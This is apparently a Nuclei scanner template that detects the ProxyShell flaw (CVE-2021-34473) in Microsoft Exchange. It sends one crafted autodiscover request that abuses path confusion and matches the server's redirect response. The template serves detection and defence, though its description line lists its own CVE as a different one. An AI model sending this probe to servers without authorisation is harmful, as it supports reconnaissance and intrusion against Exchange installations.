id: CVE-2021-34473

info:
  name: Exchange Server RCE (Proxyshell)
  author: intx0x80
  severity: critical
  description: |
      Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-34423,CVE-2021-34473,CVE-2021-31207 ,proxyshell
  tags: cve, CVE-2021-34473,RCE,,exchange

  reference: |
      - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
      - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
      - https://www.shodan.io/search?query=vuln%3ACVE-2021-34473
      

requests:
  - raw:
      - |
        GET /autodiscover/autodiscover.json?@1337.com/owa/?&Email=autodiscover/autodiscover.json%3F@1337.com  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Language: en
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302


      - type: word
        words:
          - 'Location: /owa/auth/errorfe.aspx?httpCode'
        part: header
